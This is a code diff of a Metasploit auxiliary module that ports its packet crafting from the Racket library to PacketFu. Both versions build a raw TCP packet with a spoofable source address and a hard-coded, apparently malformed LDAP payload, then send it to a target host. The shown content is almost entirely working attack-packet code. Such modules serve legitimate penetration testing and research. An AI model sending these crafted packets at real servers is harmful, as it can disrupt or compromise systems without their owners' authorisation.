@@ -10,7 +10,6 @@
 ##
 
 require 'msf/core'
-require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -50,30 +49,17 @@ class Metasploit3 < Msf::Auxiliary
 
 		open_pcap
 
-		n = Racket::Racket.new
-
-		n.l3 = Racket::L3::IPv4.new
-		n.l3.src_ip = datastore['SHOST'] || Rex::Socket.source_address(rhost)
-		n.l3.dst_ip = rhost
-		n.l3.protocol = 6
-		n.l3.id = rand(0x10000)
-		n.l3.ttl = 64
-
-		n.l4 = Racket::L4::TCP.new
-		n.l4.src_port = rand(65535)+1
-		n.l4.seq = rand(0x100000000)
-		n.l4.ack = rand(0x100000000)
-		n.l4.flag_psh = 1
-		n.l4.flag_ack = 1
-		n.l4.dst_port = datastore['RPORT'].to_i
-		n.l4.window = 3072
-		n.l4.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
-
-		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')
-
-		pkt = n.pack
-
-		capture_sendto(pkt, rhost)
+		p = PacketFu::TCPPacket.new
+		p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
+		p.ip_daddr = rhost
+		p.tcp_ack = rand(0x100000000)
+		p.tcp_flags.syn = 1
+		p.tcp_flags.ack = 1
+		p.tcp_dport = datastore['RPORT'].to_i
+		p.tcp_window = 3072
+		p.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
+		p.recalc
+		capture_sendto(p, rhost)
 
 		close_pcap
 
